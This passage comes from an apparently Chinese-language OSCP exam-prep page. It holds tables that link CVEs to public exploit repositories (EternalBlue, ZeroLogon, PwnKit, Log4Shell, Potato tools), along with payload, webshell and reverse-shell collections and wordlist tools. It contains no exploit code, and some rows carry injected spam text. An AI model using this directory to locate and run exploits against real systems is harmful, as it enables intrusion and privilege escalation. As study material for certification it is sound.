<td>CVE-2014-6271</td>
<td>Shellshock RCE PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/zalalov/CVE-2014-6271">https://github.com/zalalov/CVE-2014-6271</a></td>
</tr>
<tr>
<td>CVE-2014-6271</td>
<td>Shellshocker RCE POC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/mubix/shellshocker-pocs">https://github.com/mubix/shellshocker-pocs</a></td>
</tr>
<tr>
<td>CVE-2016-5195</td>
<td>脏牛LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></td>
</tr>
<tr>
<td>CVE-2016-5195</td>
<td>脏牛“&#x2F;proc&#x2F;self&#x2F;mem”竞争条件（&#x2F;etc&#x2F;passwd 方法）LPE</td>
<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40847">https://www.exploit-db.com/exploits/40847</a></td>
</tr>
<tr>
<td>CVE-2016-5195</td>
<td>脏牛“PTRACE_POKEDATA”竞争条件（&#x2F;etc&#x2F;passwd 方法）LPE</td>
<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40839">https://www.exploit-db.com/exploits/40839</a></td>
</tr>
<tr>
<td>CVE-2017-0144</td>
<td>永恒之蓝 (MS17-010) RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/d4t4s3c/Win7Blue">https://github.com/d4t4s3c/Win7Blue</a></td>
</tr>
<tr>
<td>CVE-2017-0199</td>
<td>RTF 炸药 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/bhdresh/CVE-2017-0199">https://github.com/bhdresh/CVE-2017-0199</a></td>
</tr>
<tr>
<td>CVE-2018-7600</td>
<td>Drupalgeddon 2 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/g0rx/CVE-2018-7600-Drupal-RCE">https://github.com/g0rx/CVE-2018-7600-Drupal-RCE</a></td>
</tr>
<tr>
<td>CVE-2018-10933</td>
<td>libSSH 身份验证绕过</td>
<td><a target="_blank" rel="noopener" href="https://github.com/blacknbunny/CVE-2018-10933">https://github.com/blacknbunny/CVE-2018-10933</a></td>
</tr>
<tr>
<td>CVE-2018-16509</td>
<td>Ghostscript PIL RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509</a></td>
</tr>
<tr>
<td>CVE-2019-14287</td>
<td>Sudo 绕过 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/n0w4n/CVE-2019-14287">https://github.com/n0w4n/CVE-2019-14287</a></td>
</tr>
<tr>
<td>CVE-2019-18634</td>
<td>Sudo 缓冲区溢出 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/saleemrashid/sudo-cve-2019-18634">https://github.com/saleemrashid/sudo-cve-2019-18634</a></td>
</tr>
<tr>
<td>CVE-2019-5736</td>
<td>RunC 容器逃生 PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></td>
</tr>
<tr>
<td>CVE-2019-6447</td>
<td>ES文件浏览器打开端口任意文件读取</td>
<td><a target="_blank" rel="noopener" href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a></td>
</tr>
<tr>
<td>CVE-2019-7304</td>
<td>dirty_sock LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a></td>
</tr>
<tr>
<td>CVE-2020-0796</td>
<td>SMBGhost RCE PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></td>
</tr>
<tr>
<td>CVE-2020-1472</td>
<td>ZeroLogon PE 检查器和利用代码</td>
<td><a target="_blank" rel="noopener" href="https://github.com/VoidSec/CVE-2020-1472">https://github.com/VoidSec/CVE-2020-1472</a></td>
</tr>
<tr>
<td>CVE-2020-1472</td>
<td>ZeroLogon PE利用脚本</td>
<td><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></td>
</tr>
<tr>
<td>CVE-2020-1472</td>
<td>ZeroLogon PE PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></td>
</tr>
<tr>
<td>CVE-2020-1472</td>
<td>ZeroLogon PE 测试脚本</td>
<td><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></td>
</tr>
<tr>
<td>CVE-2021-1675、CVE-2021-34527</td>
<td>PrintNightmare LPE RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527">https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527</a></td>
</tr>
<tr>
<td>CVE-2021-1675</td>
<td>PrintNightmare LPE RCE（PowerShell 实施）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></td>
</tr>
<tr>
<td>CVE-2021-21972</td>
<td>vCenter 远程代码执行</td>
<td><a target="_blank" rel="noopener" href="https://github.com/horizon3ai/CVE-2021-21972">https://github.com/horizon3ai/CVE-2021-21972</a></td>
</tr>
<tr>
<td>CVE-2021-22204</td>
<td>ExifTool 命令注入 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/AssassinUKG/CVE-2021-22204">https://github.com/AssassinUKG/CVE-2021-22204</a></td>
</tr>
<tr>
<td>CVE-2021-22204</td>
<td>亚搏体育appGitLab ExifTool RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/CsEnox/Gitlab-Exiftool-RCE">https://github.com/CsEnox/Gitlab-Exiftool-RCE</a></td>
</tr>
<tr>
<td>CVE-2021-22204</td>
<td>GitLab ExifTool RCE（Python 实现）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/conisolabs/CVE-2021-22204-exiftool</a></td>
</tr>
<tr>
<td>CVE-2021-26085</td>
<td>Confluence 服务器 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Phuong39/CVE-2021-26085">https://github.com/Phuong39/CVE-2021-26085</a></td>
</tr>
<tr>
<td>CVE-2021-27928</td>
<td>MariaDB&#x2F;MySQL wsrep 提供商 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Al1ex/CVE-2021-27928">https://github.com/Al1ex/CVE-2021-27928</a></td>
</tr>
<tr>
<td>CVE-2021-3129</td>
<td>Laravel 框架 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/nth347/CVE-2021-3129_exploit">https://github.com/nth347/CVE-2021-3129_exploit</a></td>
</tr>
<tr>
<td>CVE-2021-3156</td>
<td>sudo &#x2F; sudo LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</a></td>
</tr>
<tr>
<td>CVE-2021-3156</td>
<td>sudo &#x2F; sudoedit LPE PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></td>
</tr>
<tr>
<td>CVE-2021-3493</td>
<td>OverlayFS Ubuntu 内核利用 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></td>
</tr>
<tr>
<td>CVE-2021-3560</td>
<td>polkit LPE（C 实现）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/hakivvi/CVE-2021-3560">https://github.com/hakivvi/CVE-2021-3560</a></td>
</tr>
<tr>
<td>CVE-2021-3560</td>
<td>波尔基特LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></td>
</tr>
<tr>
<td>CVE-2021-3560</td>
<td>polkit LPE PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a></td>
</tr>
<tr>
<td>CVE-2021-36934</td>
<td>蜂巢噩梦 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></td>
</tr>
<tr>
<td>CVE-2021-36942</td>
<td>小波坦</td>
<td><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">https://github.com/topotam/PetitPotam</a></td>
</tr>
<tr>
<td>CVE-2021-36942</td>
<td>DFS强制</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Wh04m1001/DFSCoerce">https://github.com/Wh04m1001/DFSCoerce</a></td>
</tr>
<tr>
<td>CVE-2021-4034</td>
<td>PwnKit Pkexec 独立漏洞利用 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a></td>
</tr>
<tr>
<td>CVE-2021-4034</td>
<td>PwnKit Pkexec LPE PoC (1)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dzonerzy/poc-cve-2021-4034">https://github.com/dzonerzy/poc-cve-2021-4034</a></td>
</tr>
<tr>
<td>CVE-2021-4034</td>
<td>PwnKit Pkexec LPE PoC (2)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></td>
</tr>
<tr>
<td>CVE-2021-4034</td>
<td>PwnKit Pkexec LPE PoC (3)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/nikaiw/CVE-2021-4034">https://github.com/nikaiw/CVE-2021-4034</a></td>
</tr>
<tr>
<td>CVE-2021-41379</td>
<td>InstallerFileTakeOver LPE（0 天）（存档）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/klinix5/InstallerFileTakeOver">https://github.com/klinix5/InstallerFileTakeOver</a></td>
</tr>
<tr>
<td>CVE-2021-41379</td>
<td>InstallerFileTakeOver LPE（0 天）（分叉）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver">https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver</a></td>
</tr>
<tr>
<td>CVE-2021-41773、CVE-2021-42013、CVE-2020-17519</td>
<td>简单的 Apache 路径遍历（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/MrCl0wnLab/SimplesApachePathTraversal">https://github.com/MrCl0wnLab/SimplesApachePathTraversal</a></td>
</tr>
<tr>
<td>CVE-2021-42278、CVE-2021-42287</td>
<td>sam-the-admin、sAMAccountName 欺骗&#x2F;域管理员模拟 PE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></td>
</tr>
<tr>
<td>CVE-2021-42278</td>
<td>sam-the-admin、sAMAccountName 欺骗&#x2F;域管理员模拟 PE（Python 实现）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ly4k/Pachine">https://github.com/ly4k/Pachine</a></td>
</tr>
<tr>
<td>CVE-2021-42287、CVE-2021-42278</td>
<td>noPac LPE (1)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></td>
</tr>
<tr>
<td>CVE-2021-42287、CVE-2021-42278</td>
<td>noPac LPE (2)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></td>
</tr>
<tr>
<td>CVE-2021-42321</td>
<td>微软Exchange服务器RCE</td>
<td><a target="_blank" rel="noopener" href="https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398">https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398</a></td>
</tr>
<tr>
<td>CVE-2021-44228</td>
<td>Log4Shell RCE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></td>
</tr>
<tr>
<td>CVE-2021-44228</td>
<td>Log4Shell RCE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></td>
</tr>
<tr>
<td>CVE-2022-0847</td>
<td>DirtyPipe-利用 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</a></td>
</tr>
<tr>
<td>CVE-2022-21999</td>
<td>SpoolFool，Windows 打印后台处理程序 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ly4k/SpoolFool">https://github.com/ly4k/SpoolFool</a></td>
</tr>
<tr>
<td>CVE-2022-22963</td>
<td>Spring4Shell RCE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/tweedge/springcore-0day-en">https://github.com/tweedge/springcore-0day-en</a></td>
</tr>
<tr>
<td>CVE-2022-23119、CVE-2022-23120</td>
<td>适用于 Linux 的趋势科技趋势科技深度安全防护系统客户端任意文件读取</td>
<td><a target="_blank" rel="noopener" href="https://github.com/modzero/MZ-21-02-Trendmicro">https://github.com/modzero/MZ-21-02-Trendmicro</a></td>
</tr>
<tr>
<td>CVE-2022-24715</td>
<td>Icinga Web 2 经过身份验证的远程代码执行 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/JacobEbben/CVE-2022-24715">https://github.com/JacobEbben/CVE-2022-24715</a></td>
</tr>
<tr>
<td>CVE-2022-26134</td>
<td>ConfluencePwn RCE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/redhuntlabs/ConfluentPwn">https://github.com/redhuntlabs/ConfluencePwn</a></td>
</tr>
<tr>
<td>CVE-2022-31214</td>
<td>Firejail &#x2F; Firejoin LPE</td>
<td><a target="_blank" rel="noopener" href="https://seclists.org/oss-sec/2022/q2/188">https://seclists.org/oss-sec/2022/q2/188</a></td>
</tr>
<tr>
<td>CVE-2022-31214</td>
<td>Firejail &#x2F; Firejoin LPE</td>
<td><a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2022/06/08/10">https://www.openwall.com/lists/oss-security/2022/06/08/10</a></td>
</tr>
<tr>
<td>CVE-2022-34918</td>
<td>Netfilter 内核利用 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/randorisec/CVE-2022-34918-LPE-PoC">https://github.com/randorisec/CVE-2022-34918-LPE-PoC</a></td>
</tr>
<tr>
<td>CVE-2022-46169</td>
<td>Cacti 身份验证绕过 RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit">https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit</a></td>
</tr>
<tr>
<td>CVE-2023-21746</td>
<td>Windows NTLM EoP LocalPotato LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/decoder-it/LocalPotato">https://github.com/decoder-it/LocalPotato</a></td>
</tr>
<tr>
<td>CVE-2023-21768</td>
<td>WinSock LPE POC 的 Windows 辅助功能驱动程序</td>
<td><a target="_blank" rel="noopener" href="https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768">https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768</a></td>
</tr>
<tr>
<td>CVE-2023-21817</td>
<td>Kerberos 解锁 LPE PoC</td>
<td><a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b">https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b</a></td>
</tr>
<tr>
<td>CVE-2023-22809</td>
<td>sudoedit LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc">https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc</a></td>
</tr>
<tr>
<td>CVE-2023-23752</td>
<td>Joomla 未经身份验证的信息泄露</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Acceis/exploit-CVE-2023-23752">https://github.com/Acceis/exploit-CVE-2023-23752</a></td>
</tr>
<tr>
<td>CVE-2023-25690</td>
<td>Apache mod_proxy HTTP 请求走私 PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dhmosfunk/CVE-2023-25690-POC">https://github.com/dhmosfunk/CVE-2023-25690-POC</a></td>
</tr>
<tr>
<td>CVE-2023-28879</td>
<td>Ghost 中的 Shell：Ghostscript RCE PoC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce">https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce</a></td>
</tr>
<tr>
<td>CVE-2023-32233</td>
<td>Netfilter nf_tables LPE 中的释放后使用</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Liuk3r/CVE-2023-32233">https://github.com/Liuk3r/CVE-2023-32233</a></td>
</tr>
<tr>
<td>CVE-2023-32629、CVE-2023-2640</td>
<td>GameOverlay Ubuntu 内核利用 LPE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://twitter.com/liadeliyahu/status/1684841527959273472?s=09">https://twitter.com/liadeliyahu/status/1684841527959273472?s=09</a></td>
</tr>
<tr>
<td>CVE-2023-36874</td>
<td>Windows 错误报告服务 LPE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Wh04m1001/CVE-2023-36874">https://github.com/Wh04m1001/CVE-2023-36874</a></td>
</tr>
<tr>
<td>CVE-2023-51467、CVE-2023-49070</td>
<td>Apache OFBiz 身份验证绕过</td>
<td><a target="_blank" rel="noopener" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass</a></td>
</tr>
<tr>
<td>CVE-2023-7028</td>
<td>亚搏体育appGitLab帐户接管</td>
<td><a target="_blank" rel="noopener" href="https://github.com/V1lu0/CVE-2023-7028">https://github.com/V1lu0/CVE-2023-7028</a></td>
</tr>
<tr>
<td>CVE-2023-7028</td>
<td>亚搏体育appGitLab帐户接管</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Vozec/CVE-2023-7028">https://github.com/Vozec/CVE-2023-7028</a></td>
</tr>
<tr>
<td>不适用</td>
<td>dompdf RCE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://github.com/positive-security/dompdf-rce">https://github.com/positive-security/dompdf-rce</a></td>
</tr>
<tr>
<td>不适用</td>
<td>dompdf XSS 到 RCE（0 天）</td>
<td><a target="_blank" rel="noopener" href="https://positive.security/blog/dompdf-rce">https://positive.security/blog/dompdf-rce</a></td>
</tr>
<tr>
<td>不适用</td>
<td>存储服务LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc">https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc</a></td>
</tr>
<tr>
<td>不适用</td>
<td>ADCS强制马铃薯</td>
<td><a target="_blank" rel="noopener" href="https://github.com/decoder-it/ADCSCoercePotato">https://github.com/decoder-it/ADCSCoercePotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>强制马铃薯LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>DCOM马铃薯LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/DCOMPotato">https://github.com/zcgonvh/DCOMPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>通用马铃薯 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/micahvandeusen/GenericPotato">https://github.com/micahvandeusen/GenericPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>神马铃薯LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>多汁马铃薯 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>马铃薯汁NG LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a></td>
</tr>
<tr>
<td>不适用</td>
<td>多马铃薯 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>远程Potato0 PE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RemotePotato0">https://github.com/antonioCoco/RemotePotato0</a></td>
</tr>
<tr>
<td>不适用</td>
<td>RoguePotato LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>烂土豆NG LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></td>
</tr>
<tr>
<td>不适用</td>
<td>SharpEfsPotato LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/bugch3ck/SharpEfsPotato">https://github.com/bugch3ck/SharpEfsPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>甘薯液化石油气</td>
<td><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>甘薯液化石油气</td>
<td><a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>S4U番茄LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/wh0amitz/S4UTomato">https://github.com/wh0amitz/S4UTomato</a></td>
</tr>
<tr>
<td>不适用</td>
<td>PrintSpoofer LPE (1)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dievus/printspoofer">https://github.com/dievus/printspoofer</a></td>
</tr>
<tr>
<td>不适用</td>
<td>PrintSpoofer LPE (2)</td>
<td><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></td>
</tr>
<tr>
<td>不适用</td>
<td>令人震惊的集装箱逃生</td>
<td><a target="_blank" rel="noopener" href="https://github.com/gabrtv/shocker">https://github.com/gabrtv/shocker</a></td>
</tr>
<tr>
<td>不适用</td>
<td>系统噩梦PE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/SystemNightmare">https://github.com/GossiTheDog/SystemNightmare</a></td>
</tr>
<tr>
<td>不适用</td>
<td>无过滤器LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/deepinstinct/NoFilter">https://github.com/deepinstinct/NoFilter</a></td>
</tr>
<tr>
<td>不适用</td>
<td>离线SAM LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/gtworek/PSBits/tree/master/OfflineSAM">https://github.com/gtworek/PSBits/tree/master/OfflineSAM</a></td>
</tr>
<tr>
<td>不适用</td>
<td>OfflineAddAdmin2 LPE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2">https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2</a></td>
</tr>
<tr>
<td>不适用</td>
<td>内核集线器</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></td>
</tr>
<tr>
<td>不适用</td>
<td>Windows 漏洞</td>
<td><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></td>
</tr>
<tr>
<td>不适用</td>
<td>预编译的 Windows 漏洞</td>
<td><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits">https://github.com/abachy17/WindowsExploits</a></td>
</tr>
</tbody></table>
<h3 id="有效载荷大全"><a href="#有效载荷大全" class="headerlink" title="有效载荷大全"></a>有效载荷大全</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>Payload Box</td>
<td><a target="_blank" rel="noopener" href="https://github.com/payloadbox">https://github.com/payloadbox</a></td>
</tr>
<tr>
<td>有效负载大全</td>
<td><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></td>
</tr>
<tr>
<td>phpgcc</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></td>
</tr>
<tr>
<td>PHP 反向 Shell</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ivan-sincek/php-reverse-shell">https://github.com/ivan-sincek/php-reverse-shell</a></td>
</tr>
<tr>
<td>webshell</td>
<td><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></td>
</tr>
<tr>
<td>web-shells</td>
<td><a target="_blank" rel="noopener" href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="爆破字典表或生成工具"><a href="#爆破字典表或生成工具" class="headerlink" title="爆破字典表或生成工具"></a>爆破字典表或生成工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>bopscrk</td>
<td><a target="_blank" rel="noopener" href="https://github.com/R3nt0n/bopscrk">https://github.com/R3nt0n/bopscrk</a></td>
</tr>
<tr>
<td>cewl</td>
<td><a target="_blank" rel="noopener" href="https://github.com/digininja/cewl">https://github.com/digininja/cewl</a></td>
</tr>
<tr>
<td>cook</td>
<td><a target="_blank" rel="noopener" href="https://github.com/giteshnxtlvl/cook">https://github.com/giteshnxtlvl/cook</a></td>
</tr>
<tr>
<td>cupp</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a></td>
</tr>
<tr>
<td>Kerberos 用户名枚举</td>
<td><a target="_blank" rel="noopener" href="https://github.com/attackdebris/kerberos_enum_userlists">https://github.com/attackdebris/kerberos_enum_userlists</a></td>
</tr>
<tr>
<td>SecLists</td>
<td><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></td>
</tr>
<tr>
<td>username-anarchy</td>
<td><a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/username-anarchy">https://github.com/urbanadventurer/username-anarchy</a></td>
</tr>
</tbody></table>
<h3 id="社交媒体资料集合"><a href="#社交媒体资料集合" class="headerlink" title="社交媒体资料集合"></a>社交媒体资料集合</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>OSCP 指南 01&#x2F;12 – 我的考试经历</td>
<td><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x">https://www.youtube.com/watch?v=9mrf-WyzkpE&amp;list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x</a></td>
</tr>
<tr>
<td>HTB文章集合</td>
<td><a target="_blank" rel="noopener" href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a></td>
</tr>
<tr>
<td>黑客技巧</td>
<td><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></td>
</tr>
<tr>
<td>黑客文章</td>
<td><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/">https://www.hackingarticles.in/</a></td>
</tr>
<tr>
<td>IppSec (YouTube)</td>
<td><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</a></td>
</tr>
<tr>
<td>IppSec.rocks</td>
<td><a target="_blank" rel="noopener" href="https://ippsec.rocks/#">https://ippsec.rocks/?#</a></td>
</tr>
<tr>
<td>0xdf</td>
<td><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/">https://0xdf.gitlab.io/</a></td>
</tr>
</tbody></table>
<h2 id="考试命令清单大全"><a href="#考试命令清单大全" class="headerlink" title="考试命令清单大全"></a>考试命令清单大全</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="Curl-工具"><a href="#Curl-工具" class="headerlink" title="Curl 工具"></a>Curl 工具</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-v</span> http://&lt;DOMAIN&gt;                                                        // verbose output<br><br><span 